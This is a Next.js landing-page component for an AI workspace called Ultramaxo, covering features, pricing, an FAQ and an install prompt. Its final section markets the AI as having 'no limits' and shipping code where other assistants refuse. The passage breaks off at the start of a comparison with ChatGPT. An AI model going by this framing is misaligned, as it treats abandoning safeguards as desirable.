"use client";

import { AnimatePresence, motion, useReducedMotion } from "framer-motion";
import {
	ArrowRight,
	CheckCircle2,
	ChevronRight,
	Menu,
	PanelRightOpen,
	X,
} from "lucide-react";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { ThemeToggle } from "./theme-toggle";

interface BeforeInstallPromptEvent extends Event {
	readonly platforms: string[];
	readonly userChoice: Promise<{
		outcome: "accepted" | "dismissed";
		platform: string;
	}>;
	prompt(): Promise<void>;
}

const fadeInUp = {
	hidden: { opacity: 0, y: 28 },
	visible: (delay = 0) => ({
		opacity: 1,
		y: 0,
		transition: {
			duration: 0.6,
			delay,
			ease: [0.22, 1, 0.36, 1],
		},
	}),
};

const navigationItems = [
	{ label: "Product", href: "#product" },
	{ label: "Use cases", href: "#use-cases" },
	{ label: "Pricing", href: "#pricing" },
	{ label: "FAQ", href: "#faq" },
	{ label: "Community", href: "https://t.me/+CQR8SWdH5nE2OTdk" },
];

const capabilityChips = [
	"UltraAgent chat",
	"code, text, image, sheet artifacts",
	"file upload and analysis",
	"custom models and BYOK flow",
	"history, export, and settings",
	"PWA install",
];

const narrativeBlocks = [
	{
		eyebrow: "Chat that keeps context",
		title: "Keep the thread, open files, and continue working without switching tools.",
		description:
			"Ultramaxo keeps chat, history, file uploads, and follow-up work inside one clean flow. The thread stays alive instead of collapsing into disposable messages.",
		bullets: [
			"Chat history stays easy to reopen and review",
			"Prompts, revisions, and follow-ups remain in one context",
			"A cleaner surface for real daily work",
		],
		mockTitle: "Context stays visible",
		mockBody:
			"Recent prompts, uploaded files, and generated output stay close at hand, so you do not restart from zero every time you reopen the workspace.",
	},
	{
		eyebrow: "Artifacts that can be used",
		title: "Answers can open directly as code, text, image, or sheet artifacts.",
		description:
			"Documents, code, images, and structured output open in a side workspace built for continued work, not as throwaway attachments.",
		bullets: [
			"Code, text, image, and sheet artifacts live in one system",
			"Editor, preview, and file list stay readable",
			"Revisions and artifact actions remain available when needed",
		],
		mockTitle: "Artifacts feel native",
		mockBody:
			"Generated output opens in a larger focused panel so editing, review, and follow-up work feel natural instead of interrupted.",
	},
	{
		eyebrow: "Modes and headroom",
		title: "Fullstack, mobile, web search, and custom models are ready when the workload gets heavier.",
		description:
			"When the work gets serious, the workspace gives you more room: fullstack mode, mobile mode, web search, custom models, image generation, and a clearer upgrade path.",
		bullets: [
			"Extra modes for different types of work",
			"Installable as an app through PWA support",
			"Still focused even when more tools are active",
		],
		mockTitle: "The workspace is the product",
		mockBody:
			"The landing page explains the product clearly. The workspace stays dark, calm, and readable for long working sessions.",
	},
];

const useCases = [
	{
		title: "Developers",
		text: "Shape feature flows, open code artifacts, inspect generated files, and keep editing without leaving the workspace.",
		accent: "from-teal-500/20 to-transparent",
	},
	{
		title: "Researchers",
		text: "Upload documents, summarize files, continue the conversation, and keep research context intact without splitting work across tools.",
		accent: "from-emerald-500/20 to-transparent",
	},
	{
		title: "Operators",
		text: "Use one place for quick drafting, structured output, history, export, and repeatable daily workflows.",
		accent: "from-cyan-500/20 to-transparent",
	},
	{
		title: "Power users",
		text: "Choose models, bring your own keys, install the app, and keep using a workspace that still feels clear when sessions get long.",
		accent: "from-teal-600/20 to-transparent",
	},
];

const pricingPlans = [
	{
		name: "Free",
		price: "Rp 0",
		period: "/ forever",
		description: "For trying the product and building a daily habit.",
		features: [
			"Core AI chat",
			"Basic workspace tools",
			"Limited history and uploads",
			"Good enough to start real work",
		],
		featured: false,
	},
	{
		name: "Early Adopter",
		price: "Rp 15.000",
		period: "/ month",
		description: "Limited offer for the first 100 users (Normal price: Rp 30.000).",
		features: [
			"Everything in Free",
			"Unlimited conversations",
			"Expanded artifact workflows",
			"Full code workspace experience",
			"More room for uploads and repeated sessions",
			"Priority support",
		],
		featured: true,
	},
	{
		name: "Annual",
		price: "Rp 150.000",
		period: "/ year",
		description: "For teams or individuals who already know this will stick.",
		features: [
			"Everything in Pro",
			"Lower effective monthly cost",
			"Long-term access without friction",
			"Best value for committed usage",
		],
		featured: false,
	},
];

const faqItems = [
	{
		question: "What makes Ultramaxo different from a normal AI chat app?",
		answer:
			"The product is designed as a workspace. Chat, artifacts, code, uploads, and iteration all stay inside one shell instead of being split across disposable messages.",
	},
	{
		question: "Can I start for free?",
		answer:
			"Yes. The free plan is intended for real product evaluation with chat, basic workspace tools, and limited history. You can move up only when your workload grows.",
	},
	{
		question: "Does dark mode change the design language?",
		answer:
			"No. The light theme is the primary presentation, while dark mode keeps the same typography, spacing, accent color, and hierarchy in a more focused studio-like shell.",
	},
	{
		question: "What can I actually do inside the workspace?",
		answer:
			"You can chat, upload files, open code or document artifacts, use fullstack or mobile modes, switch models, export chats, and install the app as a PWA for a more native workflow.",
	},
];

const UltramaxoLogo = ({ size = 34 }: { size?: number }) => (
	<svg
		aria-label="Ultramaxo logo"
		className="shrink-0"
		fill="none"
		height={size}
		role="img"
		viewBox="0 0 64 64"
		width={size}
		xmlns="http://www.w3.org/2000/svg"
	>
		<defs>
			<linearGradient id="ultramaxo-mark" x1="12" x2="52" y1="10" y2="54">
				<stop offset="0%" stopColor="#0F766E" />
				<stop offset="100%" stopColor="#14B8A6" />
			</linearGradient>
		</defs>
		<rect
			className="text-[#111315] dark:text-[#f3f4f1]"
			fill="currentColor"
			height="64"
			rx="18"
			width="64"
		/>
		<path
			d="M17 16V36C17 44.8 22.2 49 30 49H34C41.8 49 47 44.8 47 36V16"
			stroke="url(#ultramaxo-mark)"
			strokeLinecap="round"
			strokeWidth="5"
		/>
		<path
			d="M24 16V35C24 39 26.7 42 31 42H33"
			stroke="url(#ultramaxo-mark)"
			strokeLinecap="round"
			strokeOpacity="0.65"
			strokeWidth="3.5"
		/>
		<path
			d="M40 16V35C40 39 37.3 42 33 42H31"
			stroke="url(#ultramaxo-mark)"
			strokeLinecap="round"
			strokeOpacity="0.65"
			strokeWidth="3.5"
		/>
	</svg>
);

function LandingNavLink({
	label,
	onClick,
}: {
	label: string;
	onClick: () => void;
}) {
	return (
		<button
			className="text-sm text-[#5f6258] transition-colors hover:text-[#171717] dark:text-[#a6aca6] dark:hover:text-[#f3f4f1]"
			onClick={onClick}
			type="button"
		>
			{label}
		</button>
	);
}

function SectionEyebrow({ children }: { children: React.ReactNode }) {
	return (
		<span className="inline-flex rounded-full border border-teal-700/10 bg-teal-600/8 px-3 py-1.5 text-[10px] sm:text-[11px] font-semibold tracking-[0.15em] sm:tracking-[0.18em] uppercase text-teal-800 dark:border-teal-400/15 dark:bg-teal-500/10 dark:text-teal-300 text-center leading-normal break-words whitespace-normal text-balance">
			{children}
		</span>
	);
}

export default function LandingPage() {
	const router = useRouter();
	const shouldReduceMotion = useReducedMotion();
	const [mobileNavOpen, setMobileNavOpen] = useState(false);
	const [openFaq, setOpenFaq] = useState<string | null>(
		faqItems[0]?.question ?? null,
	);
	const [deferredPrompt, setDeferredPrompt] =
		useState<BeforeInstallPromptEvent | null>(null);
	const [isInstallable, setIsInstallable] = useState(false);
	const [heroTilt, setHeroTilt] = useState({ x: 0, y: 0 });

	useEffect(() => {
		if (
			process.env.NODE_ENV === "development" ||
			(typeof window !== "undefined" && window.location.hostname === "localhost")
		) {
			setIsInstallable(true);
		}

		const handleBeforeInstallPrompt = (event: Event) => {
			event.preventDefault();
			setDeferredPrompt(event as BeforeInstallPromptEvent);
			setIsInstallable(true);
		};

		window.addEventListener("beforeinstallprompt", handleBeforeInstallPrompt);

		return () => {
			window.removeEventListener(
				"beforeinstallprompt",
				handleBeforeInstallPrompt,
			);
		};
	}, []);

	const scrollToSection = (href: string) => {
		if (href.startsWith("http")) {
			window.open(href, "_blank");
			return;
		}
		setMobileNavOpen(false);
		const element = document.querySelector(href);
		if (element) {
			element.scrollIntoView({ behavior: "smooth", block: "start" });
		}
	};

	const handleUpgrade = async (planName: string, e: React.MouseEvent) => {
		e.preventDefault();
		router.push("/plan");
	};

	const handleInstallClick = async () => {
		if (!deferredPrompt) {
			return;
		}

		await deferredPrompt.prompt();
		const { outcome } = await deferredPrompt.userChoice;

		if (outcome === "accepted") {
			setDeferredPrompt(null);
			setIsInstallable(false);
		}
	};

	const handleHeroPointerMove = (
		event: React.MouseEvent<HTMLDivElement>,
	) => {
		if (shouldReduceMotion) {
			return;
		}

		const bounds = event.currentTarget.getBoundingClientRect();
		const pointerX = (event.clientX - bounds.left) / bounds.width;
		const pointerY = (event.clientY - bounds.top) / bounds.height;

		setHeroTilt({
			x: (pointerY - 0.5) * -10,
			y: (pointerX - 0.5) * 12,
		});
	};

	const resetHeroPointer = () => {
		setHeroTilt({ x: 0, y: 0 });
	};

	return (
		<div className="min-h-screen overflow-hidden bg-[#f4f1ea] text-[#171717] transition-colors duration-500 selection:bg-teal-600/15 dark:bg-[#111315] dark:text-[#f3f4f1]">
			<div className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
				<div className="absolute inset-0 bg-[radial-gradient(circle_at_top,rgba(20,184,166,0.16),transparent_36%),radial-gradient(circle_at_80%_22%,rgba(12,74,110,0.08),transparent_24%)] dark:bg-[radial-gradient(circle_at_top,rgba(20,184,166,0.12),transparent_28%),radial-gradient(circle_at_80%_22%,rgba(45,212,191,0.07),transparent_20%)]" />
				<div className="absolute inset-0 bg-[radial-gradient(#111315_0.8px,transparent_0.8px)] bg-size-[12px_12px] opacity-[0.05] dark:bg-[radial-gradient(#f3f4f1_0.7px,transparent_0.7px)] dark:opacity-[0.06]" />
			</div>

			<header className="fixed inset-x-0 top-0 z-50 border-b border-[#171717]/6 bg-[#f4f1ea]/80 backdrop-blur-xl dark:border-white/6 dark:bg-[#111315]/80">
				<div className="mx-auto flex h-18 max-w-345 items-center justify-between px-5 sm:px-8 lg:px-10">
					<button
						className="flex items-center gap-3"
						onClick={() => scrollToSection("#hero")}
						type="button"
					>
						<UltramaxoLogo size={30} />
						<div className="text-left">
							<div className="text-sm font-semibold tracking-tight">Ultramaxo</div>
							<div className="text-[11px] text-[#5f6258] dark:text-[#a6aca6]">
								AI workspace
							</div>
						</div>
					</button>

					<nav className="hidden items-center gap-7 md:flex">
						{navigationItems.map((item) => (
							<LandingNavLink
								key={item.label}
								label={item.label}
								onClick={() => scrollToSection(item.href)}
							/>
						))}
					</nav>

					<div className="hidden items-center gap-3 md:flex">
						<ThemeToggle />
						<button
							className="rounded-full px-4 py-2 text-sm font-medium text-[#171717] transition-colors hover:bg-[#171717]/5 dark:text-[#f3f4f1] dark:hover:bg-white/5"
							onClick={() => router.push("/login")}
							type="button"
						>
							Sign in
						</button>
						<button
							className="inline-flex items-center gap-2 rounded-full bg-[#111315] px-5 py-2.5 text-sm font-semibold text-[#f3f4f1] transition-transform hover:scale-[1.02] dark:bg-[#f3f4f1] dark:text-[#111315]"
							onClick={() => router.push("/register")}
							type="button"
						>
							Start free <ArrowRight className="size-4" />
						</button>
					</div>

					<div className="flex items-center gap-2 md:hidden">
						<ThemeToggle />
						<button
							className="inline-flex size-10 items-center justify-center rounded-full border border-[#171717]/8 bg-white/50 dark:border-white/8 dark:bg-white/5"
							onClick={() => setMobileNavOpen((current) => !current)}
							type="button"
						>
							{mobileNavOpen ? <X className="size-4" /> : <Menu className="size-4" />}
						</button>
					</div>
				</div>

				<AnimatePresence>
					{mobileNavOpen && (
						<motion.div
							animate={{ opacity: 1, height: "auto" }}
							className="border-t border-[#171717]/6 bg-[#f4f1ea] px-5 py-5 dark:border-white/6 dark:bg-[#111315] md:hidden"
							exit={{ opacity: 0, height: 0 }}
							initial={{ opacity: 0, height: 0 }}
						>
							<div className="flex flex-col gap-4">
								{navigationItems.map((item) => (
									<LandingNavLink
										key={item.label}
										label={item.label}
										onClick={() => scrollToSection(item.href)}
									/>
								))}
								<button
									className="rounded-full border border-[#171717]/8 px-4 py-3 text-left text-sm font-medium dark:border-white/8"
									onClick={() => router.push("/login")}
									type="button"
								>
									Sign in
								</button>
								<button
									className="rounded-full bg-[#111315] px-4 py-3 text-left text-sm font-semibold text-[#f3f4f1] dark:bg-[#f3f4f1] dark:text-[#111315]"
									onClick={() => router.push("/register")}
									type="button"
								>
									Start free
								</button>
							</div>
						</motion.div>
					)}
				</AnimatePresence>
			</header>

			<main>
				<section
					className="px-5 pb-20 pt-28 sm:px-8 sm:pt-32 lg:px-10 lg:pb-28"
					id="hero"
				>
					<div className="mx-auto grid max-w-345 gap-14 lg:grid-cols-[minmax(0,1.08fr)_minmax(420px,0.92fr)] lg:items-center">
						<div className="max-w-190">
							<motion.div
								animate="visible"
								custom={0}
								initial="hidden"
								variants={fadeInUp}
							>
								<SectionEyebrow>
									Light-first landing, dark-ready workspace
								</SectionEyebrow>
							</motion.div>
							<motion.h1
								animate="visible"
								className="mt-7 max-w-[12ch] text-balance text-[2.75rem] font-semibold leading-[1.05] sm:leading-[0.94] tracking-[-0.04em] sm:tracking-[-0.055em] text-[#171717] sm:text-6xl lg:text-[5.4rem] dark:text-[#f3f4f1] break-words"
								custom={0.08}
								initial="hidden"
								variants={fadeInUp}
							>
								One AI workspace for chat, artifacts, files, and daily execution.
							</motion.h1>
							<motion.p
								animate="visible"
								className="mt-7 max-w-[62ch] text-pretty text-lg leading-8 text-[#5f6258] dark:text-[#a6aca6]"
								custom={0.16}
								initial="hidden"
								variants={fadeInUp}
							>
								Ultramaxo brings UltraAgent chat, code and document artifacts, file uploads, workspace modes, and reusable history into one product. The landing explains the system clearly. The workspace is built for actual work.
							</motion.p>
							<motion.div
								animate="visible"
								className="mt-9 flex flex-col gap-3 sm:flex-row"
								custom={0.24}
								initial="hidden"
								variants={fadeInUp}
							>
								<motion.button
									className="interactive-button inline-flex items-center justify-center gap-2 rounded-full bg-[#111315] px-6 py-3.5 text-sm font-semibold text-[#f3f4f1] shadow-[0_18px_40px_rgba(23,23,23,0.14)] dark:bg-[#f3f4f1] dark:text-[#111315] dark:shadow-[0_18px_40px_rgba(255,255,255,0.08)]"
									whileHover={shouldReduceMotion ? undefined : { scale: 1.02 }}
									whileTap={shouldReduceMotion ? undefined : { scale: 0.985 }}
									onClick={() => router.push("/register")}
									type="button"
								>
									Start free <ArrowRight className="size-4" />
								</motion.button>
								<motion.button
									className="interactive-button inline-flex items-center justify-center gap-2 rounded-full border border-[#171717]/8 bg-white/60 px-6 py-3.5 text-sm font-medium text-[#171717] shadow-[0_12px_30px_rgba(23,23,23,0.06)] dark:border-white/8 dark:bg-white/5 dark:text-[#f3f4f1] dark:hover:bg-white/8"
									whileHover={shouldReduceMotion ? undefined : { scale: 1.015 }}
									whileTap={shouldReduceMotion ? undefined : { scale: 0.99 }}
									onClick={() => scrollToSection("#product")}
									type="button"
								>
									See the workspace <ChevronRight className="size-4" />
								</motion.button>
								{isInstallable && (
									<motion.button
										className="interactive-button inline-flex items-center justify-center rounded-full border border-teal-700/10 bg-teal-600/8 px-6 py-3.5 text-sm font-semibold text-teal-800 dark:border-teal-400/15 dark:bg-teal-500/10 dark:text-teal-300"
										whileHover={shouldReduceMotion ? undefined : { scale: 1.015 }}
										whileTap={shouldReduceMotion ? undefined : { scale: 0.99 }}
										onClick={handleInstallClick}
										type="button"
									>
										Install app
									</motion.button>
								)}
							</motion.div>
							<motion.div
								animate="visible"
								className="mt-9 flex flex-wrap gap-x-5 gap-y-3"
								custom={0.32}
								initial="hidden"
								variants={fadeInUp}
							>
								{[
									"Chat, uploads, and artifacts in one flow",
									"Custom models, web search, and focused modes",
									"Installable workspace for daily use",
								].map((item) => (
									<motion.div
										className="interactive-chip flex items-center gap-2 rounded-full border border-[#171717]/8 bg-white/50 px-3 py-2 text-sm text-[#5f6258] dark:border-white/8 dark:bg-white/4 dark:text-[#a6aca6]"
										key={item}
										whileHover={shouldReduceMotion ? undefined : { y: -2 }}
									>
										<CheckCircle2 className="size-4 text-teal-700 dark:text-teal-300" />
										<span>{item}</span>
									</motion.div>
								))}
							</motion.div>
						</div>

						<motion.div
							animate="visible"
							className="relative perspective-[1600px]"
							custom={0.12}
							initial="hidden"
							onMouseLeave={resetHeroPointer}
							onMouseMove={handleHeroPointerMove}
							variants={fadeInUp}
						>
							<motion.div
								className="interactive-surface relative overflow-hidden rounded-4xl border border-[#171717]/8 bg-[linear-gradient(180deg,rgba(255,255,255,0.72),rgba(232,225,212,0.9))] p-4 shadow-[0_32px_90px_rgba(23,23,23,0.08)] dark:border-white/8 dark:bg-[linear-gradient(180deg,rgba(28,31,35,0.96),rgba(17,19,21,0.98))] dark:shadow-[0_32px_90px_rgba(0,0,0,0.4)]"
								style={
									shouldReduceMotion
										? undefined
										: {
											rotateX: heroTilt.x,
											rotateY: heroTilt.y,
											transformStyle: "preserve-3d",
										}
								}
								transition={{ type: "spring", stiffness: 140, damping: 18, mass: 0.6 }}
							>
								<div
									className="ambient-float absolute -right-10 top-10 h-28 w-28 rounded-full bg-teal-500/10 blur-3xl dark:bg-teal-400/10"
									style={
										shouldReduceMotion
											? undefined
											: {
												transform: `translate3d(${heroTilt.y * 2}px, ${heroTilt.x * -2}px, 0)`,
											}
									}
								/>
								<div
									className="absolute inset-0 opacity-60"
									style={
										shouldReduceMotion
											? undefined
											: {
												background: `radial-gradient(circle at ${50 + heroTilt.y * 2}% ${42 - heroTilt.x * 2}%, rgba(20,184,166,0.14), transparent 28%)`,
											}
									}
								/>
								<div className="grid gap-4 lg:grid-cols-[minmax(0,0.92fr)_minmax(0,1.08fr)]">
									<div className="interactive-surface rounded-[26px] border border-[#171717]/7 bg-[#fcfbf8] p-4 dark:border-white/6 dark:bg-[#171b1e]">
										<div className="flex items-center justify-between border-b border-[#171717]/6 pb-3 dark:border-white/6">
											<div className="flex items-center gap-3">
												<UltramaxoLogo size={26} />
												<div>
													<div className="text-sm font-semibold">Workspace</div>
													<div className="text-[11px] text-[#5f6258] dark:text-[#a6aca6]">
														live conversation
													</div>
												</div>
											</div>
											<div className="rounded-full border border-teal-700/12 bg-teal-600/8 px-3 py-1 text-[10px] font-semibold uppercase tracking-[0.18em] text-teal-800 dark:border-teal-400/15 dark:bg-teal-500/10 dark:text-teal-300">
												<span className="status-pulse mr-1.5 inline-block size-1.5 rounded-full bg-current align-middle" />
												live chat
											</div>
										</div>
										<div className="space-y-3 py-4">
											<div className="ml-auto max-w-[85%] rounded-[22px] rounded-tr-md bg-[#111315] px-4 py-3 text-sm text-[#f3f4f1] dark:bg-[#f3f4f1] dark:text-[#111315]">
												Open a code artifact, inspect uploaded files, and keep the whole flow inside chat history.
											</div>
											<div className="max-w-[88%] rounded-[22px] rounded-tl-md border border-[#171717]/7 bg-white px-4 py-3 text-sm leading-7 text-[#171717] dark:border-white/6 dark:bg-[#202429] dark:text-[#f3f4f1]">
												I opened a code artifact, prepared the file structure, and kept the conversation context intact so the next revision does not start from scratch.
											</div>
											<div className="rounded-[20px] border border-[#171717]/7 bg-[#f7f4ee] px-4 py-3 dark:border-white/6 dark:bg-[#15181b]">
												<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#5f6258] dark:text-[#a6aca6]">
													Current focus
												</div>
												<div className="mt-2 text-sm leading-6 text-[#171717] dark:text-[#f3f4f1]">
													Move from chat into the artifact, clean up the files, and prepare the next revision without leaving the page.
												</div>
											</div>
										</div>
									</div>

									<div className="interactive-surface relative rounded-[28px] border border-[#171717]/7 bg-[#111315] p-4 text-[#f3f4f1] dark:border-white/6 dark:bg-[#0f1113]">
										<div className="flex items-center justify-between border-b border-white/6 pb-3">
											<div>
												<div className="text-sm font-semibold">Artifact workspace</div>
												<div className="text-[11px] text-[#a6aca6]">code + text + image + sheet</div>
											</div>
											<PanelRightOpen className="size-4 text-teal-300" />
										</div>
										<div className="mt-4 flex flex-wrap gap-2 border-b border-white/6 pb-3 text-[11px] font-semibold uppercase tracking-[0.16em] text-[#a6aca6]">
											<span className="rounded-full border border-teal-400/20 bg-teal-500/10 px-3 py-1.5 text-teal-200 shadow-sm transition-transform hover:scale-105 cursor-pointer">code</span>
											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">text</span>
											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">image</span>
											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">sheet</span>
										</div>
										<div className="mt-4 grid min-h-90 gap-4 md:grid-cols-[220px_minmax(0,1fr)]">
											<div className="rounded-[22px] border border-white/6 bg-white/3 p-3">
												<div className="mb-3 text-[11px] font-semibold uppercase tracking-[0.18em] text-[#a6aca6] px-2">
													Files
												</div>
												<div className="space-y-1.5 text-sm">
													<div className="rounded-xl border border-teal-500/20 bg-teal-500/10 px-3 py-2 text-teal-200 shadow-[0_2px_10px_rgba(20,184,166,0.1)] flex items-center justify-between cursor-pointer">
														<span className="truncate">client.tsx</span>
														<span className="w-1.5 h-1.5 rounded-full bg-teal-400 animate-pulse"></span>
													</div>
													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
														chat.tsx
													</div>
													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
														landing-page.tsx
													</div>
													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
														globals.css
													</div>
												</div>
											</div>
											<div className="grid gap-4">
												<div className="rounded-[22px] border border-white/6 bg-[#15181b] p-3">
													<div className="mb-3 flex items-center justify-between">
														<div className="text-sm font-medium">artifacts/code/client.tsx</div>
														<div className="rounded-full border border-white/8 px-2 py-1 text-[10px] uppercase tracking-[0.14em] text-[#a6aca6]">
															Streaming ready
														</div>
													</div>
													<pre className="overflow-x-auto rounded-[18px] bg-[#0f1113] p-4 text-xs leading-6 text-[#dbe1dc]">
														<code>{`export const codeArtifact = {
  kind: "code",
  onStream: "update-document",
  actions: ["copy", "save", "open"],
};`}</code>
													</pre>
												</div>
												<div className="grid gap-4 sm:grid-cols-2">
													<div className="rounded-[20px] border border-white/6 bg-[#15181b] p-3">
														<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#a6aca6]">Revision</div>
														<div className="mt-2 text-sm leading-6 text-[#f3f4f1]">Workspace copy refined, pricing updated, and artifact presentation aligned with the real product.</div>
													</div>
													<div className="rounded-[20px] border border-white/6 bg-[#15181b] p-3">
														<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#a6aca6]">Available actions</div>
														<div className="mt-2 text-sm leading-6 text-[#f3f4f1]">Open a file, compare revisions, continue in chat, or export the result when the draft is ready.</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
								<div className="ambient-float absolute -bottom-4 left-5 rounded-[22px] border border-[#171717]/7 bg-white/88 px-4 py-3 shadow-[0_18px_45px_rgba(23,23,23,0.08)] dark:border-white/8 dark:bg-[#1b1f23]/95 dark:shadow-[0_18px_45px_rgba(0,0,0,0.35)]">
									<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#5f6258] dark:text-[#a6aca6]">
										Response profile
									</div>
									<div className="mt-1 text-2xl font-semibold tracking-[-0.04em] text-[#171717] dark:text-[#f3f4f1]">
										Fast, focused, editable
									</div>
								</div>
							</motion.div>
						</motion.div>
					</div>
				</section>

				<section className="px-5 pb-6 sm:px-8 lg:px-10" id="product">
					<div className="mx-auto max-w-345 border-y border-[#171717]/8 py-5 dark:border-white/8">
						<div className="flex flex-wrap items-center gap-2">
							{capabilityChips.map((chip) => (
								<motion.span
									className="interactive-chip rounded-full border border-[#171717]/8 bg-white/55 px-3 py-1.5 text-xs font-medium text-[#5f6258] dark:border-white/8 dark:bg-white/5 dark:text-[#cfd4cf]"
									key={chip}
									whileHover={shouldReduceMotion ? undefined : { y: -2, scale: 1.02 }}
								>
									{chip}
								</motion.span>
							))}
						</div>
					</div>
				</section>

				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28">
					<div className="mx-auto max-w-345">
						<div className="max-w-190">
							<SectionEyebrow>Product narrative</SectionEyebrow>
							<h2 className="mt-6 max-w-[14ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
								A cleaner path from asking to shipping.
							</h2>
							<p className="mt-5 max-w-[62ch] text-lg leading-8 text-[#5f6258] dark:text-[#a6aca6]">
								The landing is meant to earn trust. The product is meant to hold up under repeated use. Every section below should feel like it leads toward the workspace, not away from it.
							</p>
						</div>

						<div className="mt-16 space-y-10">
							{narrativeBlocks.map((block, index) => (
								<motion.div
									className="interactive-surface grid gap-6 rounded-[34px] border border-[#171717]/8 bg-white/58 p-6 shadow-[0_18px_45px_rgba(23,23,23,0.04)] dark:border-white/8 dark:bg-white/3 dark:shadow-none lg:grid-cols-[minmax(0,0.92fr)_minmax(0,1.08fr)] lg:p-8"
									key={block.title}
									initial={shouldReduceMotion ? undefined : { opacity: 0, y: 24 }}
									transition={{ duration: 0.55, delay: index * 0.06, ease: [0.22, 1, 0.36, 1] }}
									viewport={{ once: true, amount: 0.25 }}
									whileHover={shouldReduceMotion ? undefined : { y: -6 }}
									whileInView={shouldReduceMotion ? undefined : { opacity: 1, y: 0 }}
								>
									<div className={index % 2 === 1 ? "lg:order-2" : undefined}>
										<SectionEyebrow>{block.eyebrow}</SectionEyebrow>
										<h3 className="mt-5 max-w-[16ch] text-3xl font-semibold leading-[1.04] tracking-[-0.04em] dark:text-[#f3f4f1]">
											{block.title}
										</h3>
										<p className="mt-4 max-w-[58ch] text-base leading-7 text-[#5f6258] dark:text-[#a6aca6]">
											{block.description}
										</p>
										<ul className="mt-6 space-y-3">
											{block.bullets.map((bullet) => (
												<li
													className="flex items-start gap-3 text-sm leading-6 text-[#171717] dark:text-[#dfe5e0]"
													key={bullet}
												>
													<CheckCircle2 className="mt-0.5 size-4 shrink-0 text-teal-700 dark:text-teal-300" />
													<span>{bullet}</span>
												</li>
											))}
										</ul>
									</div>

									<div className={index % 2 === 1 ? "lg:order-1" : undefined}>
										<div className="relative h-full min-h-70 overflow-hidden rounded-[28px] border border-[#171717]/8 bg-[linear-gradient(180deg,rgba(255,255,255,0.74),rgba(244,241,234,0.96))] p-5 dark:border-white/8 dark:bg-[linear-gradient(180deg,rgba(28,31,35,0.94),rgba(17,19,21,0.98))]">
											<div className="absolute inset-x-0 top-0 h-32 bg-[radial-gradient(circle_at_top_left,rgba(20,184,166,0.18),transparent_60%)] dark:bg-[radial-gradient(circle_at_top_left,rgba(45,212,191,0.12),transparent_60%)]" />
											<div className="relative flex h-full flex-col justify-between rounded-[22px] border border-[#171717]/8 bg-white/72 p-5 dark:border-white/8 dark:bg-[#171b1f]/82">
												<div>
													<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#5f6258] dark:text-[#a6aca6]">
														{block.mockTitle}
													</div>
													<div className="mt-3 text-2xl font-semibold tracking-[-0.035em] text-[#171717] dark:text-[#f3f4f1]">
														{index === 0 && "Threads, files, and next actions"}
														{index === 1 && "Document and code output that stays readable"}
														{index === 2 && "A focused shell for repeated iteration"}
													</div>
													<p className="mt-3 max-w-[48ch] text-sm leading-6 text-[#5f6258] dark:text-[#a6aca6]">
														{block.mockBody}
													</p>
												</div>
												<div className="grid gap-3 sm:grid-cols-2">
													<div className="rounded-[18px] border border-[#171717]/8 bg-[#f7f4ee] p-4 dark:border-white/8 dark:bg-[#131619]">
														<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#5f6258] dark:text-[#a6aca6]">
															Mode
														</div>
														<div className="mt-2 text-sm font-medium dark:text-[#f3f4f1]">
															{index === 2 ? "Execution" : "Planning"}
														</div>
													</div>
													<div className="rounded-[18px] border border-[#171717]/8 bg-[#f7f4ee] p-4 dark:border-white/8 dark:bg-[#131619]">
														<div className="text-[11px] font-semibold uppercase tracking-[0.18em] text-[#5f6258] dark:text-[#a6aca6]">
															Surface
														</div>
														<div className="mt-2 text-sm font-medium dark:text-[#f3f4f1]">
															{index === 1 ? "Artifact" : "Workspace"}
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</motion.div>
							))}
						</div>
					</div>
				</section>

				<section className="px-5 py-20 sm:px-8 lg:px-10 lg:py-28 bg-[#fcfbf8] dark:bg-[#0a0c0e]" id="showcase">
					<div className="mx-auto max-w-345">
						<div className="max-w-190 mb-16">
							<SectionEyebrow>No limits. No lectures.</SectionEyebrow>
							<h2 className="mt-6 max-w-[14ch] text-balance text-4xl font-semibold leading-[1.02] tracking-[-0.045em] sm:text-5xl dark:text-[#f3f4f1]">
								When traditional AI says no, Ultramaxo ships the code.
							</h2>
							<p className="mt-5 max-w-[62ch] text-lg leading-8 text-[#5f6258] dark:text-[#a6aca6]">
								Built for security researchers, pentesters, and power users who need raw answers without moral lectures. Compare the difference below.
							</p>
						</div>

						<div className="grid lg:grid-cols-2 gap-8 relative">
							{/* ChatGPT Side */}
							<motion.div 
								initial={shouldReduceMotion ? undefined : { opacity: 0, x: -20 }}
								whileInView={shouldReduceMotion ? undefined : { opacity: 1, x: 0 }}
								viewport={{ once: true }}
								className="interactive-surface rounded-[24px] border border-red-500/20 bg-red-500/5 p-6 dark:border-red-900/30 dark:bg-red-950/20 relative overflow-hidden backdrop-blur-sm shadow-[0_8px_30px_rgba(220,38,38,0.04)] dark:shadow-none"
							>
								<div className="absolute top-0 right-0 p-4 opacity-30 hover:opacity-100 transition-opacity">
									<div className="flex gap-1.5">
										<div className="w-3 h-3 rounded-full bg-red-400/80"></div>
										<div className="w-3 h-3 rounded-full bg-yellow-400/80"></div>
										<div className="w-3 h-3 rounded-full bg-green-400/80"></div>
									</div>
								</div>
								<div className="flex items-center justify-between mb-6 pb-4 border-b border-red-500/10 dark:border-red-900/40">
									<div className="flex items-center gap-3">
